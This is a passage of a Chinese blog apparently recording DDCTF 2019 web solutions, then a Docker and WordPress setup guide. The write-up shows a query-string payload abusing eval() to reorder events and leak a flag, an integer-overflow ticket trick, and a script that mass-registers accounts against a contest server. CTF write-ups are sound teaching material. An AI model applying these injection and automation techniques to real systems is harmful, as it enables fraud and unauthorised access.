action+&apos;;&apos;).split(&apos;#&apos;)</span><br><span class="line">                        截取event中action;之后的字符并且以#进行分割，赋给args</span><br><span class="line"></span><br><span class="line">			try:</span><br><span class="line">				event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;))</span><br><span class="line">                                把action的值与_handler或者_function进行拼接</span><br><span class="line"></span><br><span class="line">				ret_val = event_handler(args)</span><br><span class="line">                                调用刚刚拼接的函数，对args进行处理</span><br><span class="line"></span><br><span class="line">			except RollBackException:</span><br><span class="line">				if resp is None: resp = &apos;&apos;</span><br><span class="line">				resp += &apos;ERROR! All transactions have been cancelled. &lt;br /&gt;&apos;</span><br><span class="line">				resp += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">				session[&apos;num_items&apos;] = request.prev_session[&apos;num_items&apos;]</span><br><span class="line">				session[&apos;points&apos;] = request.prev_session[&apos;points&apos;]</span><br><span class="line">				break</span><br><span class="line">                        抛出错误时执行的操作</span><br><span class="line"></span><br><span class="line">			except Exception, e:</span><br><span class="line">				if resp is None: resp = &apos;&apos;</span><br><span class="line">				continue</span><br><span class="line">                        没什么意义</span><br><span class="line"></span><br><span class="line">			if ret_val is not None:</span><br><span class="line">				if resp is None: resp = ret_val</span><br><span class="line">				else: resp += ret_val</span><br><span class="line">                        如果刚刚调用的函数有回显结果，那么把结果赋给resp</span><br><span class="line"></span><br><span class="line">	if resp is None or resp == &apos;&apos;: resp = (&apos;404 NOT FOUND&apos;, 404)</span><br><span class="line">        如果无回显，页面则会显示404</span><br><span class="line"></span><br><span class="line">	session.modified = True</span><br><span class="line">	return resp</span><br><span class="line">        将最后执行的结果返回</span><br></pre></td></tr></table></figure>
<p>整个网页的基本构造了解了，一些初始化定义的函数也详细分析了，现在开始粗略的流程分析，可以看到，当我们第一次访问页面的时候，querystring会被赋值为action:index;False#False，也就是说一开始会调用index_handler([False,False])，我们跟着看看这个函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def index_handler(args):</span><br><span class="line">	bool_show_source = str(args[0])</span><br><span class="line">	bool_download_source = str(args[1])</span><br><span class="line">	if bool_show_source == &apos;True&apos;:</span><br><span class="line">		source = open(&apos;eventLoop.py&apos;, &apos;r&apos;)</span><br><span class="line">		html = &apos;&apos;</span><br><span class="line">		if bool_download_source != &apos;True&apos;:</span><br><span class="line">			html += &apos;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">			html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">		for line in source:</span><br><span class="line">			if bool_download_source != &apos;True&apos;:</span><br><span class="line">				html += line.replace(&apos;&amp;&apos;,&apos;&amp;amp;&apos;).replace(&apos;\t&apos;, &apos;&amp;nbsp;&apos;*4).replace(&apos; &apos;,&apos;&amp;nbsp;&apos;).replace(&apos;&lt;&apos;, &apos;&amp;lt;&apos;).replace(&apos;&gt;&apos;,&apos;&amp;gt;&apos;).replace(&apos;\n&apos;, &apos;&lt;br /&gt;&apos;)</span><br><span class="line">			else:</span><br><span class="line">				html += line</span><br><span class="line">		source.close()</span><br><span class="line">		</span><br><span class="line">		if bool_download_source == &apos;True&apos;:</span><br><span class="line">			headers = &#123;&#125;</span><br><span class="line">			headers[&apos;Content-Type&apos;] = &apos;text/plain&apos;</span><br><span class="line">			headers[&apos;Content-Disposition&apos;] = &apos;attachment; filename=serve.py&apos;</span><br><span class="line">			return Response(html, headers=headers)</span><br><span class="line">		else:</span><br><span class="line">			return html</span><br><span class="line">	else:</span><br><span class="line">		trigger_event(&apos;action:view;index&apos;)</span><br><span class="line"></span><br><span class="line">这个函数主要是定义初始界面，当bool_show_source为true时，代码会打开eventLoop.py，如果bool_download_source为true会将文件进行下载，而为false的话，则是会把代码回显到页面。</span><br></pre></td></tr></table></figure>
<p>很明显我们第一次访问，调用的是index_handler([False,False])，所以直接跳到调用view_handler(index)，我们接着跟上去看看。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def view_handler(args):</span><br><span class="line">	page = args[0]</span><br><span class="line">	html = &apos;&apos;</span><br><span class="line">	html += &apos;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&apos;.format(session[&apos;num_items&apos;], session[&apos;points&apos;])</span><br><span class="line">	if page == &apos;index&apos;:</span><br><span class="line">		html += &apos;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">		html += &apos;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">		html += &apos;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">	elif page == &apos;shop&apos;:</span><br><span class="line">		html += &apos;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">	elif page == &apos;reset&apos;:</span><br><span class="line">		del session[&apos;num_items&apos;]</span><br><span class="line">		html += &apos;Session reset.&lt;br /&gt;&apos;</span><br><span class="line">	html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">	return html</span><br><span class="line">一开始就是通过读取session中的参数值，并且回显到页面上，接着如果args为index，则给出三个功能的链接跳转按钮，如果是shop则调用buy_handler函数，如果是reset，则对session重置，接着在最后加上返回最初界面的功能键。</span><br></pre></td></tr></table></figure>
<p>这就是初始界面的由来，其他的功能我们也不完全去分析了，现在我们该对如何拿flag进行一个分析。<br>在源码的最开头有这样一个函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def FLAG():</span><br><span class="line">	return &apos;FLAG_is_here_but_i_wont_show_you&apos;  # censored</span><br></pre></td></tr></table></figure>
<p>经过我们对前面的分析可以知道，在通过execute_event_loop()函数调用其他函数的时候，其他函数的末尾要么是_handler要么是_function，调用FLAG()函数是不可能的，我们找找有没有其他可以得到flag的方法。<br>接着发现了这样一个函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def show_flag_function(args):</span><br><span class="line">	flag = args[0]</span><br><span class="line">	#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span><br><span class="line">	return &apos;You naughty boy! ;) &lt;br /&gt;&apos;</span><br></pre></td></tr></table></figure>
<p>可以发现我们的确可以调用这个函数，也可以利用漏洞把flag值赋值到flag变量中，但是它固定回显，并不会把flag变量给输出，所以还得继续找其他的函数。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def get_flag_handler(args):</span><br><span class="line">	if session[&apos;num_items&apos;] &gt;= 5:</span><br><span class="line">		trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries</span><br><span class="line">	trigger_event(&apos;action:view;index&apos;)</span><br><span class="line">当我们钻石的数量大于等于5个的时候，会调用show_flag_function()函数获取通过调用FLAG()函数返回的flag值。</span><br></pre></td></tr></table></figure>
<p>具体解释一下为什么这里调用了FLAG()，由于eval的缘故，虽然FLAG()被当作get_flag_function()函数的参数，但还是会先执行，返回的值再给get_flag_function()函数作为参数的值。<br>可以在前面trigger_event函数的定义中得知，一旦函数被执行，是会将调用结果储存到session的log中的。也就是说我们只需要满足五个钻石的条件，就可以在log中得到flag。那我们重点跟一下购买的函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def buy_handler(args):</span><br><span class="line">	num_items = int(args[0])</span><br><span class="line">	if num_items &lt;= 0: return &apos;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&apos;.format(args[0])</span><br><span class="line">	session[&apos;num_items&apos;] += num_items </span><br><span class="line">	trigger_event([&apos;func:consume_point;&#123;&#125;&apos;.format(num_items), &apos;action:view;index&apos;])</span><br><span class="line">购买的数量小于0会返回错误提示，先加上购买的数量，再执行consume_point_function()函数</span><br><span class="line"></span><br><span class="line">def consume_point_function(args):</span><br><span class="line">	point_to_consume = int(args[0])</span><br><span class="line">	if session[&apos;points&apos;] &lt; point_to_consume: raise RollBackException()</span><br><span class="line">	session[&apos;points&apos;] -= point_to_consume</span><br><span class="line">该函数则是确认是否有足够的金额来购买钻石，如果不够抛出错误异常，够的话将point减去购买钻石的数量。</span><br></pre></td></tr></table></figure>
<p>可以看到这是典型的先货后款的操作，如果我们在购买完5个钻石之后，在触发报错之前立马调用get_flag_handler()不就可以拿到flag了吗？那如何利用呢？<br>整个函数调用流程是先通过trigger_event将即将执行的函数添加到待调用函数序列中，也就是说我们先传参传入的早，函数就执行的早。<br>我们可以回过头看看execute_event_loop()函数中对参数的处理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">is_action = event[0] == &apos;a&apos;</span><br><span class="line">			action = get_mid_str(event, &apos;:&apos;, &apos;;&apos;)</span><br><span class="line">			args = get_mid_str(event, action+&apos;;&apos;).split(&apos;#&apos;)</span><br><span class="line">			try:</span><br><span class="line">				event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;))</span><br><span class="line">				ret_val = event_handler(args)</span><br></pre></td></tr></table></figure>
<p>也就是说参数是以#进行分割的，而存在的eval()函数又可以帮助我们利用#注释掉后面的东西，所以这里就达到了调用函数可控的条件，我们可以测试一下。</p>
<p><img src="/images/26/13.png" alt=""></p>
<p>可以看到成功利用了，那接着我们是不是可以通过调用trigger_event()函数，先把buy和get_flag传入进去呢？即使buy函数之后的验证函数也得在get_flag之后才能执行了，构造payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;10%23action:get_flag;</span><br></pre></td></tr></table></figure>
<p>查看cookie中的session，进行解码就能拿到flag了。</p>
<p><img src="/images/26/14.png" alt=""></p>
<h2 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h2><p>有注册先注册，登入发现需要购买门票。我们余额只有100元，但是一张票却要2000。这里可以想到整数溢出漏洞。<br>首先抓包修改门票价格。通过测试发现这是32位的服务器，也就是说4294967296溢出变为0。</p>
<p><img src="/images/26/9.png" alt=""></p>
<p>可以看到有订单显示了，我们试着支付看看。</p>
<p><img src="/images/26/10.png" alt=""></p>
<p>可以看到我们支付成功，并且跳转到了游戏界面。界面中有一个移除对手的功能，点开发现需要得知id以及ticket。<br>说实话我在这里卡住了，尝试了修改json中的数据，但是最后还是自欺欺人，正确的思路应该是不断注册小号，获取id和ticket来进行移除，脚本如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">tmpID = &quot;1&quot;</span><br><span class="line"></span><br><span class="line">tmpSession = requests.session()</span><br><span class="line"></span><br><span class="line">registerURL = &quot;http://117.51.147.155:5050/ctf/api/register?name=Iuhrey&#123;name&#125;&amp;password=12345678aa90&quot;</span><br><span class="line">buyTicketURL = &quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&quot;</span><br><span class="line">payTicketURL = &quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&#123;bill&#125;&quot;</span><br><span class="line">removeRobotsURL = &quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;uid&#125;&amp;ticket=&#123;ticket&#125;&quot;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Cookie&quot;: &quot;REVEL_SESSION=367aac22fa4d096ee5e45e5e214071cf; user_name=5am3&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def getTicket(tmpID):</span><br><span class="line">    tmpRegisterURL = registerURL.replace(&quot;&#123;name&#125;&quot;,tmpID)</span><br><span class="line">    tmpSession.get(tmpRegisterURL)</span><br><span class="line"></span><br><span class="line">    billID = tmpSession.get(buyTicketURL).json()[&quot;data&quot;][0][&quot;bill_id&quot;]</span><br><span class="line"></span><br><span class="line">    # print(billID)</span><br><span class="line"></span><br><span class="line">    tmpPayTicketURL = payTicketURL.replace(&quot;&#123;bill&#125;&quot;,billID)</span><br><span class="line">    # print(tmpPayTicketURL)</span><br><span class="line">    ticketJson = tmpSession.get(tmpPayTicketURL).json()</span><br><span class="line">    # print(ticketJson)</span><br><span class="line">    ticket,uid = ticketJson[&quot;data&quot;][0].values()</span><br><span class="line"></span><br><span class="line">    return ticket,uid</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    i = 1</span><br><span class="line">    c = 0</span><br><span class="line">    while(i&lt;3 and c &lt; 50):</span><br><span class="line">        name = str(random.randint(1000, 90000))</span><br><span class="line">        c+=1</span><br><span class="line">        try:</span><br><span class="line">            ticket,uid = getTicket(name)</span><br><span class="line">            # print(ticket,uid)</span><br><span class="line"></span><br><span class="line">            tmpRRURL = removeRobotsURL.replace(&quot;&#123;uid&#125;&quot;,str(uid)).replace(&quot;&#123;ticket&#125;&quot;,ticket)</span><br><span class="line">            RRjson = requests.get(tmpRRURL,headers=headers).json()</span><br><span class="line"></span><br><span class="line">            if(RRjson[&quot;data&quot;]):</span><br><span class="line">                print(&quot;[&quot;+str(i)+&quot;] &quot; + str(RRjson[&quot;data&quot;]))</span><br><span class="line">                print(&quot;&quot;)</span><br><span class="line">                i+=1</span><br><span class="line">            time.sleep(1)</span><br><span class="line"></span><br><span class="line">        except:</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/04/17/DDCTF-WEB部分wp/" data-id="cjv4r4rxn000lmcvjx806g3vn" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛总结/">比赛总结</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-记录搭建docker时踩的一些列坑" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/07/记录搭建docker时踩的一些列坑/" class="article-date">
  <time class="post-time" datetime="2019-03-07T08:46:15.000Z" itemprop="datePublished">
    <span class="post-month">3月</span><br>
    <span class="post-day">07</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/07/记录搭建docker时踩的一些列坑/">记录搭建docker时踩的一些列坑</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于近期要利用docker搭建环境复现一些漏洞，因此就学习了一波docker，没想到遇上了一堆坑，所以利用这篇文章来记录下坑如何解决的。</p>
<h2 id="环境选择"><a href="#环境选择" class="headerlink" title="环境选择"></a>环境选择</h2><p>我首推的还是在ubuntu下进行docker的安装，强烈不建议在centos的环境下，为什么要在ubuntu下呢，主要是因为centos太烂了，如果要在centos下安装ubuntu，首先得要求内核要大于3.10.0，查看内核命令如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure>
<p>最低要求的3.10.0由于内核版本太低，例如overlay2这种功能就无法实现，这样会导致在后续安装中出现一系列的问题，解决一个又出另外一个。我就是迫于无奈才抛弃了centos，转而利用ubuntu安装了docker。这里ubuntu选用的是最新的18.04版本。</p>
<h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><p>首先得确保apt是最新版本，如果不是使用如下命令进行更新:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<p>接着如果有旧版本的docker，使用以下命令移除:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io</span><br></pre></td></tr></table></figure>
<p>添加使用 HTTPS 传输的软件包以及 CA 证书</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure>
<p>添加Docker的GPG密钥，由于官方的被墙了，只能使用国内源的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
<p>然后，我们需要向 source.list 中添加 Docker 软件源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] 	https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure>
<p>最后，我们安装docker</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update </span><br><span class="line">sudo apt-get install docker-ce</span><br></pre></td></tr></table></figure>
<p>启动docker</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable docker</span><br><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure>
<p>运行docker试试，如果出现以下内容，则说明成功安装了docker<br><img src="/images/24/1.png" alt=""></p>
<h2 id="利用docker搭建环境"><a href="#利用docker搭建环境" class="headerlink" title="利用docker搭建环境"></a>利用docker搭建环境</h2><p>首先是获取镜像，这里获取的是原生的ubuntu</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu:18.04</span><br></pre></td></tr></table></figure>
<p>查看镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<p>运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d --name 容器名称 -p 8000:80 /bin/bash ubuntu:18.04</span><br></pre></td></tr></table></figure>
<p>简要说明一下参数的作用，-it实际是两个参数-t和-i的合成，-i是指交互式操作，-t则是终端的意思，-d则是让容器在后台挂起，并且可以看到返回的id，–name则是新建容器的名称，-p表示docker的80端口映射到虚拟机的8000端口，/bin/bash则是表示调用的命令，最后是你镜像的名字。<br>这里简要说明一下，镜像类似c++中的类，而容器则是类的实体化，你只能对容器进行操作，而不能直接对镜像进行操作，每次启用docker run这个命令时，都会产生一个新的容器。可以用如下命令看到所有的容器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container ls -a</span><br></pre></td></tr></table></figure>
<p>这个可以看到运行的容器:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
<p>查看了容器的id，可以通过以下命令进入容器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 容器id前三到四位 /bin/bash</span><br></pre></td></tr></table></figure>
<p>接着就能在docker里面配置你想要的环境了</p>
<h2 id="安装wordpress"><a href="#安装wordpress" class="headerlink" title="安装wordpress"></a>安装wordpress</h2><p>首先更新apt包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
<p>在配置lamp环境前，说一下对服务操作的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">service xxxx restart 重启</span><br><span class="line"></span><br><span class="line">service xxxx status 状态</span><br><span class="line"></span><br><span class="line">service xxxx start 启动</span><br><span class="line"></span><br><span class="line">service xxxx stop 关闭</span><br></pre></td></tr></table></figure>
<p>接着安装apache2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install apache2</span><br></pre></td></tr></table></figure>
<p>接着是mysql</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server mysql-client</span><br></pre></td></tr></table></figure>
<p>中途会让你设置密码，输入两次密码回车即可   </p>
<p>接着是安装php以及php的一些服务插件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.0</span><br><span class="line"></span><br><span class="line">apt-get install libapache2-mod-php7.0 </span><br><span class="line"></span><br><span class="line">apt-get install php7.0-mysql</span><br></pre></td></tr></table></figure>
<p>重启apache2和mysql</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 restart</span><br><span class="line"></span><br><span class="line">service mysql restart</span><br></pre></td></tr></table></figure>
<p>此时在/var/www/html下创建一个php文件，若php文件被解析那就说php安装成功  </p>
<p>安装phpmyadmin</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install phpmyadmin</span><br></pre></td></tr></table></figure>
<p>安装时：空格选择apache2，enter确定，下一步配置数据库，输入密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/share/phpmyadmin /var/www/html</span><br></pre></td></tr></table></figure>
<p>启用Apache mod_rewrite模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a2enmod rewrite</span><br></pre></td></tr></table></figure>
<p>重启服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service php7.0-fpm restart</span><br></pre></td></tr></table></figure>
<p>配置vim /etc/apache2/apache2.conf<br>在最底下加入如下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .htm .html </span><br><span class="line"></span><br><span class="line">AddDefaultCharset UTF-8</span><br></pre></td></tr></table></figure>
<p>重启apache服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure>
<p>建立数据库为wordpress</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 登录数据库</span><br><span class="line">mysql -u root -p</span><br><span class="line"># 创建数据库</span><br><span class="line">CREATE DATABASE wordpress;</span><br><span class="line"># 创建数据库用户和密码</span><br><span class="line">CREATE USER wordpressuser@localhost IDENTIFIED BY &apos;123456&apos;;</span><br><span class="line"># 设置wordpressuser访问wordpress数据库权限</span><br><span class="line">GRANT ALL PRIVILEGES ON wordpress.* TO user@localhost IDENTIFIED BY &apos;pass&apos;;//user为你所设置的user，pass为你所设置的密码</span><br><span class="line"># 刷新数据库设置</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"># 退出数据库</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<p>下载wordpress</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://cn.wordpress.org/wordpress-4.8.1-zh_CN.tar.gz</span><br></pre></td></tr></table></figure>
<p>解压</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf latest.tar.gz</span><br></pre></td></tr></table></figure>
<p>远程批量传输</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avP /wordpress/ /var/www/html/wordpress</span><br></pre></td></tr></table></figure>
<p>切换到wordpress目录，复制wp-config.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/wordpress</span><br><span class="line">cp wp-config-sample.php wp-config.php</span><br></pre></td></tr></table></figure>
<p>编辑wp-config.php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim wp-config.php</span><br></pre></td></tr></table></figure>
<p>把刚刚我们设置的user和pass填入，修改之后为<br><img src="/images/24/2.png" alt=""><br>接着访问<br><a href="http://ip/wordpress/wp-admin/install.php" target="_blank" rel="noopener">http://ip/wordpress/wp-admin/install.php</a><br>按照提示来就行了</p>
